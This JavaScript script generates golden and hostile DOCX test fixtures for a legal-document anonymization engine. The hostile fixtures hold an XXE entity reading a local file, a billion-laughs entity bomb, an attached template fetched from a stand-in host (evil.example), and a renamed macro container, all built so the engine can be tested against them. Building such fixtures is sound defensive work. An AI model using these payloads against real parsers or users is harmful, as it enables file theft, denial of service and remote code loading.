// Generates the golden/hostile DOCX set in test-data/docx/ (DOCX-REBUILD
// §12: "złote pliki testowe powstają w MD1 i rosną z każdym modułem").
//
// Deterministic: the fixture builder writes zeroed timestamps, so re-running
// this script reproduces every file byte-for-byte — any diff in git means
// the generator changed, never the clock. The engine itself is NOT imported
// here (it needs DOMParser, a browser/jsdom API); the binding between these
// files and the engine's behavior lives in src/docx-rebuild/goldens.test.js,
// which reads the committed files from disk and asserts on real code.
//
// Usage: node scripts/generate-docx-rebuild-goldens.mjs
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildZip } from '../src/docx-rebuild/test-helpers/zip-fixture.js';

const OUT = resolve(dirname(fileURLToPath(import.meta.url)), '..', 'test-data', 'docx');
mkdirSync(OUT, { recursive: true });

const XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
const R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const CT = 'http://schemas.openxmlformats.org/package/2006/content-types';
const REL = 'http://schemas.openxmlformats.org/package/2006/relationships';
const RT = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';

const contentTypes = (overrides = '') => `${XML_DECL}<Types xmlns="${CT}">`
  + '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
  + '<Default Extension="xml" ContentType="application/xml"/>'
  + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
  + overrides
  + '</Types>';

const rootRels = `${XML_DECL}<Relationships xmlns="${REL}">`
  + `<Relationship Id="rId1" Type="${RT}/officeDocument" Target="word/document.xml"/>`
  + '</Relationships>';

// --- golden-pismo.docx -----------------------------------------------------
// A realistic brief exercising every §5 structure at once: whole-run token,
// run-split token (Word's spellchecker split, repaired first-run-wins),
// token inside a hyperlink's text, fldSimple field result, tracked insert
// (replaced), tracked delete (report-only delText), header + footer tokens
// ("papier firmowy"), and one external hyperlink (the ONLY allowed egress
// class §9.3 — reported, never blocking).
const goldenDocument = `${XML_DECL}<w:document xmlns:w="${W}" xmlns:r="${R}"><w:body>`
  + '<w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:b/></w:rPr><w:t>ODPOWIEDŹ NA POZEW</w:t></w:r></w:p>'
  + '<w:p><w:r><w:t xml:space="preserve">Powód [PERSON_NAME_1], zamieszkały: [ADDRESS_1], wniósł o zapłatę.</w:t></w:r></w:p>'
  + '<w:p><w:r><w:t xml:space="preserve">Pozwany [PERSON_</w:t></w:r><w:r><w:rPr><w:i/></w:rPr><w:t>NAME_2] wnosi o oddalenie powództwa w całości.</w:t></w:r></w:p>'
  + '<w:p><w:r><w:t xml:space="preserve">Pełna treść orzeczenia: </w:t></w:r>'
  + '<w:hyperlink r:id="rId4"><w:r><w:rPr><w:u w:val="single"/></w:rPr><w:t>sygn. [CASE_NUMBER_1] w Legalisie</w:t></w:r></w:hyperlink></w:p>'
  + '<w:p><w:fldSimple w:instr=" DOCPROPERTY Klient "><w:r><w:t>Klient: [PERSON_NAME_1]</w:t></w:r></w:fldSimple></w:p>'
  + '<w:p><w:ins w:id="1" w:author="AI"><w:r><w:t xml:space="preserve">Wnosimy o zasądzenie od [PERSON_NAME_2] kosztów procesu.</w:t></w:r></w:ins>'
  + '<w:del w:id="2" w:author="AI"><w:r><w:delText xml:space="preserve">dawny zapis o [PERSON_NAME_1]</w:delText></w:r></w:del></w:p>'
  + '<w:sectPr><w:headerReference w:type="default" r:id="rId2"/><w:footerReference w:type="default" r:id="rId3"/></w:sectPr>'
  + '</w:body></w:document>';

const goldenParts = {
  '[Content_Types].xml': contentTypes(
    '<Override PartName="/word/header1.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"/>'
    + '<Override PartName="/word/footer1.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footer+xml"/>',
  ),
  '_rels/.rels': rootRels,
  'word/_rels/document.xml.rels': `${XML_DECL}<Relationships xmlns="${REL}">`
    + `<Relationship Id="rId2" Type="${RT}/header" Target="header1.xml"/>`
    + `<Relationship Id="rId3" Type="${RT}/footer" Target="footer1.xml"/>`
    + `<Relationship Id="rId4" Type="${RT}/hyperlink" Target="https://sip.legalis.pl/" TargetMode="External"/>`
    + '</Relationships>',
  'word/document.xml': goldenDocument,
  'word/header1.xml': `${XML_DECL}<w:hdr xmlns:w="${W}"><w:p><w:r><w:t xml:space="preserve">Kancelaria K-LAW – pełnomocnik [PERSON_NAME_1]</w:t></w:r></w:p></w:hdr>`,
  'word/footer1.xml': `${XML_DECL}<w:ftr xmlns:w="${W}"><w:p><w:r><w:t xml:space="preserve">[ADDRESS_1] · tel. sekretariatu</w:t></w:r></w:p></w:ftr>`,
};

// --- hostile-egress-template.docx -------------------------------------------
// Valid DOCX with a token, but its rels smuggle an attachedTemplate pointing
// outside. §9.3: any non-hyperlink external reference blocks the EXPORT
// (import shows the diagnosis); the file itself opens fine in Word.
const egressParts = {
  '[Content_Types].xml': contentTypes(),
  '_rels/.rels': rootRels,
  'word/_rels/document.xml.rels': `${XML_DECL}<Relationships xmlns="${REL}">`
    + `<Relationship Id="rId9" Type="${RT}/attachedTemplate" Target="http://evil.example/szablon.dotm" TargetMode="External"/>`
    + '</Relationships>',
  'word/document.xml': `${XML_DECL}<w:document xmlns:w="${W}"><w:body><w:p><w:r><w:t>Pozwany [PERSON_NAME_1].</w:t></w:r></w:p></w:body></w:document>`,
};

// --- hostile-doctype-xxe.docx / hostile-billion-laughs.docx -----------------
// C-DOCX-1: OOXML never legally carries a DTD; both must be refused at the
// pre-scan, before any XML parser sees a byte.
const doctypeParts = {
  '[Content_Types].xml': contentTypes(),
  '_rels/.rels': rootRels,
  'word/document.xml': '<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///C:/Users/ofiara/Documents/tajne.txt">]>'
    + `<w:document xmlns:w="${W}"><w:body><w:p><w:r><w:t>&xxe; [PERSON_NAME_1]</w:t></w:r></w:p></w:body></w:document>`,
};

const billionParts = {
  '[Content_Types].xml': contentTypes(),
  '_rels/.rels': rootRels,
  'word/document.xml': '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    + '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>'
    + `<w:document xmlns:w="${W}"><w:body><w:p><w:r><w:t>&lol3;</w:t></w:r></w:p></w:body></w:document>`,
};

// --- hostile-macros.docx -----------------------------------------------------
// A macro container renamed to .docx. C-DOCX-9: refusal with a clear error,
// never a silent zero-replacement pass.
const macroParts = {
  '[Content_Types].xml': contentTypes(
    '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
  ),
  '_rels/.rels': rootRels,
  'word/document.xml': `${XML_DECL}<w:document xmlns:w="${W}"><w:body><w:p><w:r><w:t>[PERSON_NAME_1]</w:t></w:r></w:p></w:body></w:document>`,
  'word/vbaProject.bin': new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
};

async function toDocx(parts) {
  return buildZip(Object.entries(parts).map(([name, data]) => ({ name, data, method: 8 })));
}

const files = [
  ['golden-pismo.docx', await toDocx(goldenParts)],
  ['hostile-egress-template.docx', await toDocx(egressParts)],
  ['hostile-doctype-xxe.docx', await toDocx(doctypeParts)],
  ['hostile-billion-laughs.docx', await toDocx(billionParts)],
  ['hostile-macros.docx', await toDocx(macroParts)],
  // C-DOCX-9's third leg: not a ZIP at all (e.g. an RTF renamed by hand).
  ['hostile-not-a-zip.docx', new TextEncoder().encode('{\\rtf1 To nie jest kontener ZIP, tylko RTF przebrany za DOCX.}')],
];

for (const [name, bytes] of files) {
  writeFileSync(join(OUT, name), bytes);
  console.log(`${name}  ${bytes.length} B`);
}
console.log(`\nZapisano ${files.length} plików w ${OUT}`);
